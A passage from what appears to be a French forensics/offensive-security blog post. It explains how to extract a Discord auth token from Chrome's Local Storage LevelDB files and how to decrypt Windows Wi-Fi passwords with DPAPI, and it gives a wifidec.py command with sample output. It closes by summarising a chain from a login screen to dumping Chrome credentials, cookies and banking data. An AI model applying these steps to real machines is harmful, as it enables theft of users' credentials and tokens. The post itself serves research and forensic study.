![](/assets/img/credentials2.png)
*Figure 9: Offline-decrypted Chrome credential.*

> Certaines entrées de `Login Data` peuvent ne pas contenir de credentials, lorsqu'un utilisateur choisit "Ne jamais enregistrer" lors d'une tentative de connexion sur un site, chrome crée une entrée servant uniquement à mémoriser ce choix (**`blacklisted_by_user = 1`**) lié au site, sans nom d'utilisateur ni mot de passe enregistré.
{: .prompt-info }

---
 
## 5. Chrome Local Storage Inspection (LevelDB)
 
Le **Local Storage** est une API JavaScript standard, disponible sur tous les navigateurs. C'est un espace de stockage clé-valeur simple que chaque site web choisit d'utiliser ou non dans son propre code JS, on y trouve souvent des jetons d'authentification (`JWT`, `OAuth`), mais aussi à peu près n'importe quel type de donnée que le site souhaite conserver côté client, cela peut représenter une vraie mine d'or.  
Ces données sont stockées dans : `\Users\AppData\Local\Google\Chrome\User Data\Default\Local Storage\leveldb\`
 
Il est possible de lire ces artefacts, et le mécanisme est complètement différent de la façon dont Chrome chiffre les données vues précédemment, elles sont stockées en clair mais sous format **LevelDB**, qui nécessite un parser pour être lu, il y en a quelques-uns tels que [crush-forensics](https://github.com/kalink0/crush-forensics) ou [ccl_chromium_reader](https://github.com/cclgroupltd/ccl_chromium_reader).
 
Pour illustrer tout ça avec un cas concret, je vais chercher un exemple connu de token stocké de cette façon : celui de **Discord**.

![](/assets/img/auth_token.png)
*Figure 10: Extracting a Discord auth token from a LevelDB file.*

---
 
## 6. Wi-Fi Credentials Decryption (WLAN)
 
Sous Windows, lors de la première connexion à un réseau Wi-Fi, le système enregistre (via le service `Wlansvc`) les credentials au sein d'un profil Wi-Fi global sous la forme d'un fichier `XML` servant à automatiser les futures connexions.  
Chaque réseau possède un fichier unique et distinct : `C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\{GUID}\*.xml`
 
Ce fichier `.xml` contient :
 
- Le `SSID` (le nom du Wi-Fi) en clair.
- Le mot de passe, stocké dans le champ `<keyMaterial>`. Il est chiffré sous forme de blob DPAPI avec la masterkey SYSTEM de la machine, il est possible de le déchiffrer avec l'outil `wifidec.py` de `dpapilab-ng`.

**Fichiers requis :**

| Fichier | Chemin |
|---------|--------|
| Profils Wi-Fi (WLAN) | `C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\{GUID}\*.xml` |
| Masterkey SYSTEM | `\System32\Microsoft\Protect\S-1-5-18\` |
| Hives `SECURITY` ET `SYSTEM` | `Windows/System32/config/SYSTEM & SECURITY` |

```bash
$ python3 wifidec.py --system SYSTEM --security SECURITY --masterkey /S-1-5-18/User/<GUID> {85BCEBD9-8FF7-4C43-B8FA-DE64A6884347}/{9760A75B-3B43-4F26-BDE3-2FF0442F2C28}.xml
 
[+] SSID:     Freebox-16FE7540
    Password: fB7xQ2mL9kR4pT8z
```
{: .nolineno }
 
---
 
## 7. Conclusion
 
Au final, tout part d'un écran de login. À partir de là, c'est une vraie chaîne d'exploitation : accès au disque, extraction des hashes **SAM**, déchiffrement du **CacheData MSA** pour récupérer le secret **DPAPI**, déchiffrement de la **Masterkey**, et finalement dump complet des credentials Chrome — mots de passe, cookies, données bancaires protégés par l'**App-Bound Encryption** de Google.
 
---
 
## 8. References
 
- [https://www.synacktiv.com/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow](https://www.synacktiv.com/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [https://www.insecurity.be/blog/2020/12/24/dpapi-in-depth-with-tooling-standalone-dpapi/](https://www.insecurity.be/blog/2020/12/24/dpapi-in-depth-with-tooling-standalone-dpapi/)
- [https://github.com/tijldeneut/diana/pull/3/](https://github.com/tijldeneut/diana/pull/3/)
- [https://github.com/laxaa/diana/blob/main/diana-msaccountdec.py](https://github.com/laxaa/diana/blob/main/diana-msaccountdec.py)
- [https://github.com/tijldeneut/dpapilab-ng/blob/main/_ngc_step_by_step_on_and_offline.py](https://github.com/tijldeneut/dpapilab-ng/blob/main/_ngc_step_by_step_on_and_offline.py)
- [https://github.com/synacktiv/CacheData_decrypt](https://github.com/synacktiv/CacheData_decrypt)
- [https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [https://chromium.googlesource.com/chromium/src/+/refs/tags/133.0.6846.2/components/os_crypt/async](https://chromium.googlesource.com/chromium/src/+/refs/tags/133.0.6846.2/components/os_crypt/async)
- [https://github.com/0rcruxe/chrome-decrypt-offline/blob/main/chrome-decrypt.py](https://github.com/0rcruxe/chrome-decrypt-offline/blob/main/chrome-decrypt.py)
- [https://github.com/aabston/chrome-decrypt-offline/pull/1](https://github.com/aabston/chrome-decrypt-offline/pull/1)
- [https://aabston.github.io/posts/chrome-v20-offline-decryption/](https://aabston.github.io/posts/chrome-v20-offline-decryption/)
- [https://github.com/tijldeneut/diana](https://github.com/tijldeneut/diana)
- [https://bebinary4n6.blogspot.com/2026/05/reading-current-leveldb-forensics-with.html](https://bebinary4n6.blogspot.com/2026/05/reading-current-leveldb-forensics-with.html)
- [https://github.com/kalink0/crush-forensics](https://github.com/kalink0/crush-forensics)